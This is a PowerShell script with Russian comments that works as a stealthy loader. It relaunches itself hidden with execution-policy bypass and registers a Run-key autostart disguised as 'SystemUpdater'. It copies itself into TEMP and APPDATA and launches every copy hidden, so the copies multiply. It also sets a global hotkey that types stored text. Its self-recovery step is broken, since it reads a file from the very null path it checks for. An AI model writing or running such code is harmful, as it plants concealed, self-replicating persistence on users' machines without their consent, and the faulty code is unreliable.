# === ШАГ 0: Самовоспроизведение (Исправление ошибки NULL) ===
# Если скрипт запущен через iex/irm, у него нет пути. Сохраняем себя в TEMP и перезапускаем.
if (-not $MyInvocation.MyCommand.Path) {
    $selfPath = "$env:TEMP\_loader_$([Guid]::NewGuid().ToString().Substring(0,8)).ps1"
    # Получаем исходный код текущего контекста выполнения
    $scriptContent = $MyInvocation.MyCommand.Definition 
    # Если Definition пуст (бывает при iex), берем весь ввод
    if ([string]::IsNullOrWhiteSpace($scriptContent)) {
        $scriptContent = [System.IO.File]::ReadAllText($MyInvocation.MyCommand.Path) 
    }
    
    Set-Content -Path $selfPath -Value $scriptContent -Encoding UTF8
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$selfPath`"" -WindowStyle Hidden
    exit
}

# === ШАГ 1: Данные ===
$data = [System.Text.Encoding]::UTF8.GetBytes("Строка1`nСтрока2`nСтрока3")
$encodedData = [Convert]::ToBase64String($data)

# === ШАГ 2: Распаковка ===
if (-not (Test-Path "$env:TEMP\data.txt")) {
    Set-Content -Path "$env:TEMP\data.txt" -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedData)))
}

# === ШАГ 3: Автозагрузка ===
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdater" /d "`"$($MyInvocation.MyCommand.Path)`"" /f | Out-Null

# === ШАГ 4: Копирование (Теперь путь есть!) ===
$dirs = @("$env:TEMP", "$env:APPDATA")
foreach ($dir in $dirs) {
    if (Test-Path $dir) {
        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination "$dir\backup_$([Guid]::NewGuid().ToString().Substring(0,8)).ps1" -Force -ErrorAction SilentlyContinue
    }
}

# === ШАГ 5: Глобальный хук клавиш (WinAPI) ===
# Исправленная версия с реальным циклом сообщений Windows
$hookCode = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class GlobalHotKey {
    [DllImport("user32.dll")]
    private static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);
    
    [DllImport("user32.dll")]
    private static extern bool GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
    
    [DllImport("user32.dll")]
    private static extern bool TranslateMessage(ref MSG lpMsg);
    
    [DllImport("user32.dll")]
    private static extern IntPtr DispatchMessage(ref MSG lpMsg);

    [StructLayout(LayoutKind.Sequential)]
    public struct MSG {
        public IntPtr hwnd;
        public uint message;
        public IntPtr wParam;
        public IntPtr lParam;
        public uint time;
        public int pt_x;
        public int pt_y;
    }

    public const int WM_HOTKEY = 0x0312;
    public const uint MOD_CONTROL = 0x0002;
    public const uint MOD_ALT = 0x0001;

    public static void Listen(Action onTrigger) {
        RegisterHotKey(IntPtr.Zero, 1, MOD_CONTROL | MOD_ALT, (byte)'Q');
        
        MSG msg;
        while (GetMessage(out msg, IntPtr.Zero, 0, 0)) {
            if (msg.message == WM_HOTKEY && msg.wParam.ToInt32() == 1) {
                onTrigger();
            }
            TranslateMessage(ref msg);
            DispatchMessage(ref msg);
        }
    }
}
"@

Add-Type -TypeDefinition $hookCode -Language CSharp

# === ШАГ 6: Логика вставки ===
function Invoke-Paste {
    try {
        $content = Get-Content "$env:TEMP\data.txt" -First 1 -ErrorAction Stop
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.SendKeys]::SendWait($content)
    } catch {
        Add-Content "$env:USERPROFILE\output.log" ("Error: " + $_.Exception.Message)
    }
}

# === ШАГ 7: Запуск слушателя и бэкапов ===
# Запускаем слушатель хоткеев в отдельном потоке, чтобы не блокировать скрипт
$thread = [System.Threading.Thread]::new([Action]{ [GlobalHotKey]::Listen({ Invoke-Paste }) })
$thread.IsBackground = $true
$thread.Start()

# Запускаем найденные копии
foreach ($dir in $dirs) {
    if (Test-Path $dir) {
        Get-ChildItem -Path $dir -Filter "backup_*.ps1" -ErrorAction SilentlyContinue | ForEach-Object {
            Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-File `"$($_.FullName)`""
        }
    }
}

# Держим основной процесс живым, пока работает поток
while ($thread.IsAlive) { Start-Sleep -Seconds 1 }